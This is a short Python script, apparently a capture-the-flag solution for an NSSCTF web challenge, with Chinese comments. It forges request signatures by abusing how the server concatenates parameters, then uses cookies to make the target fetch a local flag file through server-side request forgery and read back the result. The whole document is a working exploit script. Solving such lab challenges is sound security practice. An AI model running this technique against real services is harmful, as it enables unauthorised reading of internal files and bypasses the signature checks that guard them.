import requests

base = "http://node4.anna.nssctf.cn:21659/"

# =====步骤1 scan：ssrf把flag写入result.txt=====
r1 = requests.get(base + "geneSign?param=http://127.0.0.1/flag")
sign_scan = r1.text.strip()
print(f"scan_sign = {sign_scan}")

c1 = {"sign": sign_scan, "action":"scan"}
res1 = requests.get(base + "De1ta?param=http://127.0.0.1/flag", cookies=c1)
print("scan返回：", res1.text)

# =====步骤2 readscan：读取result.txt=====
r2 = requests.get(base + "geneSign?param=flag.txtread")
sign_read = r2.text.strip()
print(f"read_sign = {sign_read}")

c2 = {"sign": sign_read, "action":"readscan"}
res2 = requests.get(base + "De1ta?param=flag.txt", cookies=c2)
print("最终结果：", res2.text)
